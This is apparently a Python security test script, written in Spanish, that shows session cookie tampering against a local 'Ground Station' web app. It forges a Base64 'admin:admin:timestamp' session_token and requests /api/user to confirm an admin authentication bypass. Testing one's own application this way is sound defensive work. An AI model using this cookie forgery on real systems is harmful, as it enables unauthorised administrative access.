#!/usr/bin/env python3
"""
Prueba Individual - Ataque 3: Falsificación de Sesión (Session Cookie Tampering)
Demuestra el bypass de autenticación forjando la cookie session_token en Base64.
"""
import base64

import requests

BASE_URL = "http://localhost:5000"

def test_attack_3():
    print("[+] Ejecutando Prueba Individual: Ataque 3 - Falsificación de Sesión...")
    # Forjar cookie de administración: admin:admin:timestamp
    forged_token = base64.b64encode(b"admin:admin:9999999999").decode('utf-8')
    cookies = {"session_token": forged_token}
    url = f"{BASE_URL}/api/user"
    try:
        response = requests.get(url, cookies=cookies, timeout=5)
        print(f"[*] GET {url} con Cookie forjada - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] Vulnerabilidad confirmada! Sesión de Admin aceptada:")
            print(response.json())
        else:
            print(f"[!] Respuesta: {response.text}")
    except Exception as e:
        print(f"[X] Error al conectar con la Ground Station: {e}")

if __name__ == "__main__":
    test_attack_3()
